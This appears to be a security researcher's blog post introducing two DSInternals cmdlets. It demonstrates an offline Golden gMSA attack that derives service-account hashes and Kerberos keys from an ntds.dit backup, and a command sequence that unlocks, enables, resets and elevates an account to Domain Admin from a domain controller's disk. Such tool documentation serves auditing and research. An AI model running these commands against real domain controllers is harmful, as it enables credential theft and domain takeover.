---
ref: dsinternals-v411
title: New Offline Capabilities in DSInternals 4.11
date: '2023-10-01T00:00:00+00:00'
layout: post
lang: en
image: /assets/images/addb-serviceaccount.png
permalink: /en/dsinternals-v4.11/
---

## Introduction

The recently released [DSInternals PowerShell Module](https://github.com/MichaelGrafnetter/DSInternals) contains two new cmdlets for offline **ntds.dit** file access, [Get-ADDBServiceAccount](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADDBServiceAccount.md#get-addbserviceaccount) and [Unlock-ADDBAccount](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Unlock-ADDBAccount.md#unlock-addbaccount). This article will guide you through the newly added capabilities.

## Golden gMSA Attack with Time Shifting

The [Get-ADDBServiceAccount](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADDBServiceAccount.md#get-addbserviceaccount) cmdlet reads all [Group Managed Service Accounts (gMSAs)](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) from an Active Directory (AD) database backup (the **ntds.dit** file) first, then it combines them with [KDS Root Keys](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/create-the-key-distribution-services-kds-root-key) and finally calculates the managed passwords and their hashes. In other words, this cmdlet performs a fully offline [Golden gMSA Attack](https://www.semperis.com/blog/golden-gmsa-attack/), against which most companies do not [protect themselves](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/recover-from-golden-gmsa-attack).

Usage of this cmdlet is pretty straightforward:

```powershell
Get-ADDBServiceAccount -DatabasePath '.\ADBackup\ntds.dit'
```

Here is a sample output of this cmdlet:

```txt
DistinguishedName: CN=svc_adfs,CN=Managed Service Accounts,DC=contoso,DC=com
Sid: S-1-5-21-2468531440-3719951020-3687476655-1109
Guid: 53c845f7-d9cd-471b-a364-e733641dcc86
SamAccountName: svc_adfs$
Description: ADFS Service Account
Enabled: True
Deleted: False
UserAccountControl: WorkstationAccount
SupportedEncryptionTypes: RC4_HMAC, AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
ServicePrincipalName: {http/login.contoso.com, host/login.contoso.com}
WhenCreated: 9/9/2023 5:02:05 PM
PasswordLastSet: 9/9/2023 5:02:06 PM
ManagedPasswordInterval: 30
ManagedPasswordId: RootKey=7dc95c96-fa85-183a-dff5-f70696bf0b11, Cycle=9/9/2023 10:00:00 AM (L0=361, L1=26, L2=24)
ManagedPasswordPreviousId:
KDS Derived Secrets
  NTHash: 0b5fbfb646dd7bce4f160ad69edb86ba
  Kerberos Keys
    AES256_CTS_HMAC_SHA1_96
      Key: 5dcc418cd0a30453b267e6e5b158be4b4d80d23fd72a6ae4d5bd07f023517117
      Iterations: 4096
    AES128_CTS_HMAC_SHA1_96
      Key: 8e1e66438a15d764ae2242eefd15e09a
      Iterations: 4096
```

Note that the `KDS Derived Secrets` section was calculated by the cmdlet.

As a result, the Golden gMSA attack provides a stepping stone to some other nasty online attacks against the NTLM and Kerberos authentication protocols, including Pass-the-Hash, Pass-the-Key, Overpass-the-Hash, and Silver Ticket attacks.

## Offline User Account Unlock

The addition of the [Unlock-ADDBAccount](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Unlock-ADDBAccount.md#unlock-addbaccount) cmdlet completes the holistic capability of the DSInternals PowerShell module to perform offline user account takeovers. With access to a hard drive of a Domain Controller (DC), it is now possible to pick any pre-existing user account, even a disabled one, and to simply [reset its password](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Set-ADDBAccountPassword.md#set-addbaccountpassword), [enable it](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Enable-ADDBAccount.md#enable-addbaccount), [unlock it](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Unlock-ADDBAccount.md#unlock-addbaccount), and [add it to the Domain Admins group](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Set-ADDBPrimaryGroup.md#set-addbprimarygroup). Thanks to the common `-SkipMetaUpdate` parameter, it is even possible to either keep the changes local to the target DC or to replicate them to all the other DCs.

Here is an example of an end-to-end approach:

```powershell
Unlock-ADDBAccount -SamAccountName john -DatabasePath 'D:\Windows\NTDS\ntds.dit'
Enable-ADDBAccount -SamAccountName john -DatabasePath 'D:\Windows\NTDS\ntds.dit'
Set-ADDBPrimaryGroup -SamAccountName john -PrimaryGroupId 512 -DatabasePath 'D:\Windows\NTDS\ntds.dit'

$pass = Read-Host -AsSecureString -Prompt 'Provide a new password for user john'
$key = Get-BootKey -OfflineHiveFilePath 'D:\Windows\System32\config\SYSTEM'
Set-ADDBAccountPassword -SamAccountName john `
                        -NewPassword $pass `
                        -DatabasePath 'D:\Windows\NTDS\ntds.dit' `
                        -BootKey $key
```

## Disclaimer

Remember that features exposed through these tools are not supported by Microsoft. Improper use might cause irreversible damage to domain controllers or negatively impact domain security.
